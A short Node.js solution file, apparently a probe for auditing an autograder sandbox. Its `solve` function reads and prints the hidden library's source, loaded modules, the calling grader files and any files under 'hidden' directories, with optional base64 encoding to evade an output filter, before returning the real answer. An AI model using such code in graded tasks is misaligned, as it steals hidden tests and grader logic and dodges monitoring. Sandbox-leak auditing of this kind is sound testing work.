// Everything a student's JavaScript can reach from inside `solve`, printed.
// LEAK_ENCODING=base64 prints it encoded, as a student would to get past a filter.
'use strict';
const fs = require('node:fs');
const path = require('node:path');
const lib = require('hidden_lib');
const encode = process.env.LEAK_ENCODING === 'base64';
const out = (label, value) => {
  const text = typeof value === 'string' ? value : JSON.stringify(value);
  console.log(`[${label}] ${encode ? Buffer.from(text).toString('base64') : text}`);
};
let looted = false;

function loot() {
  // The library's functions print their own source.
  for (const [k, f] of Object.entries(lib)) out(`lib ${k}`, String(f));
  // Every module loaded so far: its exports and its file.
  for (const [file, m] of Object.entries(require.cache)) {
    if (file === __filename) continue;
    try { out(`module ${file} exports`, m.exports); } catch {}
    try { out(`module ${file}`, fs.readFileSync(file, 'utf8')); } catch (e) { out(`module ${file}`, `unreadable: ${e.code}`); }
  }
  // Whoever called us: the stack names the files.
  for (const m of new Error().stack.matchAll(/\((\/[^:]+):\d+:\d+\)/g)) {
    try { out(`caller ${m[1]}`, fs.readFileSync(m[1], 'utf8')); } catch (e) { out(`caller ${m[1]}`, `unreadable: ${e.code}`); }
  }
  // And any file under a directory called hidden.
  const walk = d => {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = path.join(d, e.name);
      if (e.isDirectory()) walk(p);
      else if (p.includes('/hidden/')) {
        try { out(`file ${p}`, fs.readFileSync(p, 'utf8')); } catch (err) { out(`file ${p}`, `unreadable: ${err.code}`); }
      }
    }
  };
  walk(path.join(__dirname, '..'));
}

exports.solve = xs => {
  if (!looted) { looted = true; loot(); }
  let total = 0;
  for (const x of xs) total += lib.weight(x);
  return total;
};
